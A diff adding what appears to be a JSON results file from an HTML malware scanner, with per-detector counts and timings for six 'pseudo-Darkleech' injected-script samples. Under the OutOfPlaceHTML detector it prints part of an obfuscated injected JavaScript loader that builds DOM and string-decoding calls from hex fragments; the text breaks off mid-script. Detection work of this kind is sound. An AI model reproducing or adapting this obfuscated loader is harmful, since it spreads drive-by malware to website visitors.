@@ -1,0 +1,959 @@
+{
+    "html": {
+        "EncodedStringHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009970664978027344,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.001994609832763672,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "EncodedURLHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009968280792236328,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            }
+        },
+        "FrameSetHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009970664978027344,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997781753540039,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "HiddenHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0019943714141845703,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997781753540039,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009968280792236328,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0006043910980224609,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009992122650146484,
+                "additional_info": {}
+            }
+        },
+        "HTML5_TagsHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009970664978027344,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            }
+        },
+        "IPExistHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997781753540039,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009970664978027344,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0010251998901367188,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009703636169433594,
+                "additional_info": {}
+            }
+        },
+        "NoFrameHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0010311603546142578,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009622573852539062,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            }
+        },
+        "XSSHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.004986286163330078,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.003021240234375,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.001001119613647461,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009946823120117188,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "NullCharacterHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "PortHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009968280792236328,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009984970092773438,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0010030269622802734,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009913444519042969,
+                "additional_info": {}
+            }
+        },
+        "UnsymmetricalTagHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997781753540039,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009963512420654297,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009992122650146484,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009949207305908203,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            }
+        },
+        "CharCountHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 737,
+                "time": 0.0009989738464355469,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 19801,
+                "time": 0.0009958744049072266,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 4580,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 4918,
+                "time": 0.0009970664978027344,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 3631,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 3166,
+                "time": 0.0009698867797851562,
+                "additional_info": {}
+            }
+        },
+        "DoubleDocumentsHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0010256767272949219,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009963512420654297,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "EmbedAndObjectHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009698867797851562,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0010249614715576172,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009982585906982422,
+                "additional_info": {}
+            }
+        },
+        "IncludedUrlsHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997304916381836,
+                "additional_info": []
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009968280792236328,
+                "additional_info": []
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": []
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009691715240478516,
+                "additional_info": []
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": []
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009963512420654297,
+                "additional_info": []
+            }
+        },
+        "KnownMaliciousPatternsHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.000997781753540039,
+                "additional_info": {}
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            },
+            "2016-02-05 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-02-24 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            },
+            "2016-03-07 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0009975433349609375,
+                "additional_info": {}
+            },
+            "2016-03-14 pseudo-Darkleech Script_injected.html": {
+                "count": 0,
+                "time": 0.0,
+                "additional_info": {}
+            }
+        },
+        "OutOfPlaceHTML": {
+            "2015-10-13 pseudo-Darkleech Script_injected.html": {
+                "count": 1,
+                "time": 0.0009968280792236328,
+                "additional_info": [
+                    [
+                        "script",
+                        "<script> </script>"
+                    ]
+                ]
+            },
+            "2015-12-16 pseudo-Darkleech Script_injected.html": {
+                "count": 6,
+                "time": 0.000997304916381836,
+                "additional_info": [
+                    [
+                        "script",
+                        "<script>\nvar eksgejxyddz=(914473161>1023011998?\"\\x6e\\x7a\\x65\":\"in\");\nvar ibhcdituyg=(2099822101<2107376903?\"\\x69\":\"un\");\nvar ufbnazaooi=(145061976<111884655?\"\\x7a\\x67\\x78\":\"\\x67\");\nvar kyxnwmpqialoz=(1322180817>1348763750?\"\\x6f\\x61\":\"C\");\nvar jhdlojbywgl=(194668559>124722040?\"\\x63\\x6f\":\"\\x6e\\x78\");\nvar nrqehvyoqvsbyf=(738029014<284772783?\"\\x6d\":\"sd\");\nvar bxsmgythlkn=(794435804>1478770337?\"zg\":\"12\");\nvar ypspcxsont=(789869198<352368084?\"\\x68\":\"\\x28\");\nvar guwugkgecseizc=(1681476215<2065752139?\"\\x41\\x74\":\"\\x61\");\nvar uevgwaxwlc=(1907083590<1466564768?\"dv\":\"Of\");\nvar msnhahtbzsvg=(1858439977<1984781522?\"retur\":\"\\x6f\\x6b\");\nvar waeneonfmmkv=(1839393329<1878104956?\"en\":\"\\x76\");\nvar phufwsysgjfch=(1592734090>1073958878?\"dex\":\"\\x73\\x74\");\nvar uijznmbmue=(1903929831<660626593?\"wp\":\"\\x2d\");\nvar vujcgqrtvmep=(1919793060>1784271452?\"!\":\"\\x74\\x6b\");\nvar zzxwycgbidngtd=(1220654151<83628341?\"nz\":\"\\x66\\x72\");\nvar rmjbcsxejqg=(2033547454<1334704355?\"c\":\"len\");\nvar izahxodjqhgsrdz=(1673431344<1668303424?\"qu\":\")\");\nvar nxhdktluzm=(1450607388>1077487303?\"h\":\"aok\");\nvar iufpfnmcgcevs=(658360843>4420682?\"\\x3c\":\"\\x73\\x76\");\nvar hjzmineiszkpwr=(19830448<443124345?\"h\":\"\\x67\\x7a\");\nvar ecczddvltdjh=(2008622174>66876738?\" \":\"hob\");\nvar xdjuhpkntpypyb=(1274623851>1153839077?\"\\x2a\":\"ez\");\nvar ozvmcudhtd=(487360929>1030528535?\"\\x76\\x78\":\"r\");\nvar yzdwyblnkba=(712706<1430106630?\"\\x45\\x6c\":\"j\");\nvar unvcpmkzgypy=(591935049<96024779?\"\\x67\":\"\\x5e\");\nvar hcvetcrqyjtpfult=(885592745>1417739660?\"l\":\"\\x3d\");\nvar jwtckkvepcf=(871136135>513479005?\"ha\":\"jg\");\nvar blntxnlnsexo=(1173992>61368?\"tr\":\"\\x70\");\nvar duyryvlrkaiup=(69535644<1856031113?\"c\":\"\\x77\\x6f\\x63\");\nvar ekhyahinlimoriqw=(882548160<777589818?\"evt\":\"\\x2e\");\nvar nbxlknardklr=(582861067<483371424?\"\\x69\":\"c\");\nvar wjfamxdgjzvejc=(254448603<108635963?\"n\":\"re\");\nvar abnzghwtkmaok=(81021840>1482231053?\"\\x6a\":\"doc\");\nwjfamxdgjzvejc+=(1218044639<1432153126?\"\\x74\":\"pl\");\nduyryvlrkaiup+=(671345559<786566044?\"onstru\":\"cfi\");\nvar limmocwdlqkxjqwb=(2092190066>895600276?\"\\x6c\\x69\\x6d\\x6d\\x6f\\x63\\x77\":\"\\x6b\");\nvar faekktuxwyfzj=(1070732741>728452060?\"\\x65\\x74\":\"\\x7a\\x71\");\nvar xrwwvqvxil=(614368918>107339825?\"%\":\"\\x73\\x71\\x71\");\nlimmocwdlqkxjqwb+=(1032539172>1190611726?\"\\x6f\":\"\\x64\\x6c\");\nnxhdktluzm+=(1984774669<1470238172?\"un\":\"\\x61\\x72\");\nvar xrdxkonzwsuf=(1394527621<576617359?\"a\":\"gf\");\nvar ryyewdpvnss=(1686427896>2083731126?\"\\x73\":\"\\x75\\x63\");\nvar lfqwuinyuf=(1641843378<1488203608?\"c\":\"\\x5d\");\nvar ysgsteikzf=(1493844665<61612702?\"sm\":\"\\x66\\x75\\x6e\\x63\");\nibhcdituyg+=(1936380785>1928603398?\"\\x6e\":\"\\x74\");\nvar pxswqeuteekutz=(44812390>1529335017?\"\\x62\":\"Str\");\nvar kzuctkepdzsux=(61208430<1625020334?\"v:\":\"\\x63\\x66\\x76\");\nibhcdituyg+=(1301597772>311448669?\"\\x6e\\x65\\x72\\x48\\x54\\x4d\\x4c\":\"\\x66\\x71\");\nvar jbxpthctxpvfoq=(1236602889<307513160?\"\\x63\":\"\\x76\\x69\");\nvar bckznviwkncv=(1587329708>1495362857?\"CI\":\"\\x6a\");\nvar hgbeftjklzvfydb=(1975704148<2053532378?\"\\x6d\\x6c\":\"\\x6b\\x6e\");\nwjfamxdgjzvejc+=(1244542177<361653641?\"\\x6d\\x63\":\"urn \");\nvar vgzrpbloebkqbje=(746954477<1364306722?\"\\x75\\x6c\":\"\\x63\");\nvar fvoyiibcdgljyvw=(1161543500<1165302968?\"HT\":\"\\x62\\x6d\");\nabnzghwtkmaok+=(2122881084>2135448755?\"\\x66\\x72\\x64\":\"\\x75\");\nwjfamxdgjzvejc+=(649753567<698710569?\"\\x68\":\"b\");\nnxhdktluzm+=(864406733>92558969?\"\\x43\\x6f\\x64\\x65\":\"kh\");\nzzxwycgbidngtd+=(1862158054>1957542678?\"\\x6f\\x6e\\x6d\":\"\\x6f\\x6d\");\nabnzghwtkmaok+=(240364319>1460261902?\"lt\":\"\\x6d\\x65\\x6e\");\nmsnhahtbzsvg+=(102806120<69505413?\"\\x71\\x6d\":\"n\");\nhjzmineiszkpwr+=(1686432360<1080973558?\"\\x64\\x78\":\"\\x6a\");\nvar bfupsonwrlc=(1418404553>1825746779?\"fv\":\"\\x26\");\nvar qznrycbxjbcrl=(275075378>2060517854?\"\\x75\":\"By\");\nvar fwfrswntwnjlo=(1426422353<683687926?\"fe\":\"AS\");\nwjfamxdgjzvejc+=(41995869>27168535?\"jzm\":\"sf\");\nhjzmineiszkpwr+=(2117580533>617566713?\"zmin\":\"ef\");\nvar gbgauqiemqtunjq=(1930688144<2032272962?\"\\x5b\":\"ez\");\nwjfamxdgjzvejc+=(144483547<78015094?\"a\":\"in\");\npxswqeuteekutz+=(1211533431>1596515999?\"\\x68\":\"in\");\nysgsteikzf+=(1212533043>1955161560?\"ft\":\"\\x74\\x69\\x6f\\x6e\\x20\");\nhjzmineiszkpwr+=(1666302068<1793186137?\"\\x65\\x69\\x73\\x7a\":\"fp\");\nvar dvfbwqagxafxd=(1550947457<1755790479?\"\\x4d\\x4c\":\"\\x69\\x79\");\npxswqeuteekutz+=(1398701058>1930205304?\"vd\":\"g\");\nabnzghwtkmaok+=(387926958<899379524?\"\\x74\\x2e\\x67\\x65\\x74\\x45\":\"ps\");\nhjzmineiszkpwr+=(1571478408<1224832376?\"\\x61\\x73\":\"\\x6b\\x70\\x77\\x72\");\nysgsteikzf+=(765037723>1824092539?\"\\x79\\x79\":\"\\x67\");\nvar mstnrmpffrtr=(558956576<45531586?\"k\":\"\\x6d\");\nduyryvlrkaiup+=(1462612916>307664681?\"c\":\"\\x6b\\x72\");\nlimmocwdlqkxjqwb+=(698018747<1255088071?\"qkx\":\"\\x77\");\nwjfamxdgjzvejc+=(207152678<965046082?\"e\":\"yz\");\nvar wzuezmfcey=(143846701<136808974?\"\\x64\":\"+\");\nrmjbcsxejqg+=(932128060>973646475?\"iwm\":\"gt\");\nmstnrmpffrtr+=(670261470<114210436?\"rr\":\"stn\");\nduyryvlrkaiup+=(1106118005>1663916229?\"izl\":\"t\");\nysgsteikzf+=(1458485206<130906841?\"gl\":\"b\");\nabnzghwtkmaok+=(1397059020<1337223104?\"jqk\":\"\\x6c\\x65\");\nrmjbcsxejqg+=(1646325836>155367130?\"h\":\"sz\");\nduyryvlrkaiup+=(1683902395>1744933174?\"cx\":\"\\x6f\\x72\");\nabnzghwtkmaok+=(1201261188>1970114234?\"\\x70\\x6d\":\"m\");\nwjfamxdgjzvejc+=(2039605591<1739783853?\"im\":\"iszk\");\nysgsteikzf+=(378494601<192172168?\"i\":\"\\x71\");\nysgsteikzf+=(1433599318>1970713880?\"kw\":\"h\");\nwjfamxdgjzvejc+=(1165827339>751621612?\"p\":\"dyn\");\nysgsteikzf+=(1667931763<2120071266?\"d\":\"bc\");\nysgsteikzf+=(697797896<87303735?\"rxo\":\"dsztm\");\nabnzghwtkmaok+=(1948770911<1999974806?\"entBy\":\"e\");\nlimmocwdlqkxjqwb+=(598028426<2082371531?\"\\x6a\":\"\\x6f\");\nabnzghwtkmaok+=(124437931<960898032?\"Id\":\"fa\");\nysgsteikzf+=(17377881>5433663?\"j\":\"t\");\nwjfamxdgjzvejc+=(1697470268>72298647?\"\\x77\\x72\\x2e\\x63\\x68\\x61\\x72\":\"\\x6e\\x77\");\nwjfamxdgjzvejc+=(2005550014>676978654?\"\\x41\":\"\\x6f\\x66\");\nwjfamxdgjzvejc+=(1426975423>643553437?\"t\":\"j\");\nysgsteikzf+=(1665021541<1885581106?\"inz\":\"b\");\nysgsteikzf+=(25156292>928755348?\"mv\":\"(\");\nwjfamxdgjzvejc+=(224190019<56662898?\"\\x63\\x6c\":\"\\x28\\x6c\\x69\\x6d\");\nlimmocwdlqkxjqwb+=(29437381>1576935?\"\\x71\":\"tu\");\nwjfamxdgjzvejc+=(616886515<113659585?\"a\":\"mo\");\nlimmocwdlqkxjqwb+=(1464418730<131160402?\"\\x78\\x70\":\"\\x77\\x62\");\nwjfamxdgjzvejc+=(1000639813>841105788?\"\\x63\\x77\":\"o\");\nmstnrmpffrtr+=(893287984<2142414931?\"\\x72\":\"\\x76\");\nysgsteikzf+=(250797082>1758845025?\"edd\":\"hjzmine\");\nwjfamxdgjzvejc+=(2089386622>1720087083?\"d\":\"\\x76\\x63\");\nwjfamxdgjzvejc+=(1802855399>1986041351?\"\\x70\\x68\":\"l\");\nmstnrmpffrtr+=(1700786332<814676906?\"\\x79\":\"\\x6d\");\nysgsteikzf+=(750935116>1836476375?\"\\x67\\x66\":\"\\x69\\x73\");\nmstnrmpffrtr+=(1682472504<1708130110?\"\\x70\":\"\\x67\\x6a\\x61\");\nwjfamxdgjzvejc+=(733116162>534311019?\"\\x71\\x6b\\x78\\x6a\\x71\\x77\\x62\\x29\\x3b\":\"\\x67\");\nysgsteikzf+=(1670913673<1955983908?\"zkp\":\"\\x61\");\nmstnrmpffrtr+=(1987455996>602961611?\"ffrtr\":\"\\x61\\x73\\x64\");\nysgsteikzf+=(1879159518<1953081196?\"wr\":\"\\x6f\\x66\");\nysgsteikzf+=(711334395<684796794?\"v\":\"\\x2c\");\nysgsteikzf+=(1337709769>1431123688?\"op\":\"\\x6c\");\nysgsteikzf+=(1699391722>88490038?\"\\x69\":\"\\x6b\");\nysgsteikzf+=(809775327<1402079348?\"mmocwdl\":\"\\x6f\\x62\\x77\");\nysgsteikzf+=(2103088383<1764582854?\"ts\":\"qk\");\nysgsteikzf+=(926170817<255689077?\"nx\":\"\\x78\\x6a\");\nysgsteikzf+=(859352732<789545157?\"cfn\":\"qw\");\nysgsteikzf+=(1253795840<1257078559?\"\\x62\\x29\\x7b\":\"lm\");\nysgsteikzf+=(26936313>4611902?\"ret\":\"si\");\nysgsteikzf+=(742245225<1278917761?\"\\x75\\x72\":\"l\");\nysgsteikzf+=(1020628441<484110050?\"\\x78\\x7a\\x75\":\"n \");\nysgsteikzf+=(329302476>1431160602?\"\\x7a\\x6f\":\"new\");\nysgsteikzf+=(1944543599>914430554?\"\\x20\\x46\":\"\\x6d\\x67\");\nysgsteikzf+=(1490140451<1101533240?\"gu\":\"\\x75\");\nysgsteikzf+=(1761080464>772125541?\"\\x6e\":\"\\x69\\x64\\x73\");\nysgsteikzf+=(949257049>140682275?\"\\x63\":\"\\x71\\x69\\x76\");\nysgsteikzf+=(1253038961>565327549?\"\\x74\\x69\\x6f\\x6e\":\"oo\");\nysgsteikzf+=(343508797>317671497?\"\\x28\":\"e\");\nysgsteikzf+=(1938984646<1592253187?\"i\":\"\\x68\\x6a\");\nysgsteikzf+=(887353475>140110120?\"\\x7a\":\"ht\");\nysgsteikzf+=(1259109575<1464155086?\"m\":\"ab\");\nysgsteikzf+=(1448432343<1144593487?\"\\x76\":\"i\");\nysgsteikzf+=(1043756072>923503373?\"n\":\"pf\");\nysgsteikzf+=(426938427>389770558?\"e\":\"q\");\nysgsteikzf+=(1875125676<1364658145?\"hk\":\"i\");\nysgsteikzf+=(1711607173<692168175?\"\\x71\\x6d\":\"\\x73\\x7a\\x6b\\x70\\x77\\x72\\x2c\\x6c\\x69\\x6d\");\nysgsteikzf+=(488185332<1431347264?\"m\":\"\\x6d\\x74\");\nysgsteikzf+=(441889262>163936480?\"\\x6f\":\"vu\");\nysgsteikzf+=(367657428<133519666?\"\\x77\\x65\":\"cw\");\nysgsteikzf+=(2131443246>2145750024?\"xg\":\"dl\");\nysgsteikzf+=(1949145396<2034991482?\"qkxj\":\"\\x6e\");\nysgsteikzf+=(150180744<1601321418?\"qwb)\":\"io\");\nysgsteikzf+=(501388247>704220667?\"\\x67\\x73\\x65\":\"\\x7d\");\nysgsteikzf+=(1835724291>413687264?\"\\x66\\x75\":\"wsc\");\nysgsteikzf+=(589463016>428327212?\"nc\":\"\\x68\");\nysgsteikzf+=(572256140>538248945?\"\\x74\\x69\\x6f\":\"\\x61\\x62\");\nysgsteikzf+=(643992229<1661248757?\"n\":\"we\");\nysgsteikzf+=(725934932>430282467?\"\\x20\":\"\\x66\");\nysgsteikzf+=(935319660<2055462526?\"\\x67\\x6d\\x68\":\"\\x72\");\nysgsteikzf+=(167653770>938128632?\"\\x6d\":\"\\x79\");\nysgsteikzf+=(1804992437<1919718269?\"ovx\":\"p\");\nysgsteikzf+=(752010143>1981692069?\"\\x72\":\"b\");\nysgsteikzf+=(665991785>548785359?\"\\x78\\x78\\x71\":\"\\x69\\x73\");\nysgsteikzf+=(1470464639>1679791851?\"\\x74\\x62\":\"\\x6a\");\nysgsteikzf+=(1046557338>1970605692?\"\\x78\":\"\\x79\");\nysgsteikzf+=(1183506624<930845979?\"\\x76\\x74\":\"\\x28\\x68\\x6a\\x7a\");\nysgsteikzf+=(1987925864<2095948785?\"m\":\"\\x66\\x72\");\nysgsteikzf+=(201147270<184837318?\"ok\":\"in\");\nysgsteikzf+=(378077011>52988665?\"\\x65\\x69\":\"\\x68\\x66\");\nysgsteikzf+=(1895371471>1963944648?\"\\x7a\\x6b\\x62\":\"s\");\nysgsteikzf+=(274980554<698214371?\"\\x7a\\x6b\\x70\":\"\\x69\\x73\");\nysgsteikzf+=(1583733879>536797112?\"\\x77\":\"le\");\nysgsteikzf+=(1768419363>2087728785?\"gqx\":\"r,limmocwdl\");\nysgsteikzf+=(721465008<1833000686?\"qk\":\"u\");\nysgsteikzf+=(58684444<1634669692?\"\\x78\":\"\\x61\\x65\");\nysgsteikzf+=(1159985320>2036569320?\"idv\":\"jqwb\");\nysgsteikzf+=(76084537<419946509?\",m\":\"bc\");\nysgsteikzf+=(194125458>127354681?\"\\x73\":\"g\");\nysgsteikzf+=(643774078>976027427?\"\\x79\\x6d\":\"\\x74\");\nysgsteikzf+=(1110514684>449257652?\"\\x6e\\x72\\x6d\":\"\\x69\");\nysgsteikzf+=(750816362<809114067?\"p\":\"\\x76\\x7a\");\nysgsteikzf+=(650059415>139768678?\"\\x66\\x66\":\"\\x7a\\x78\\x79\");\nysgsteikzf+=(2046847430>229411163?\"\\x72\\x74\\x72\\x29\\x7b\\x72\":\"\\x79\\x78\");\nysgsteikzf+=(23543481<1687899744?\"e\":\"\\x74\");\nysgsteikzf+=(298143202>355808929?\"\\x6c\\x6e\\x69\":\"\\x74\\x75\");\nysgsteikzf+=(1662585753<557936216?\"\\x70\":\"\\x72\");\nysgsteikzf+=(1936065580<643613603?\"\\x77\\x66\":\"n 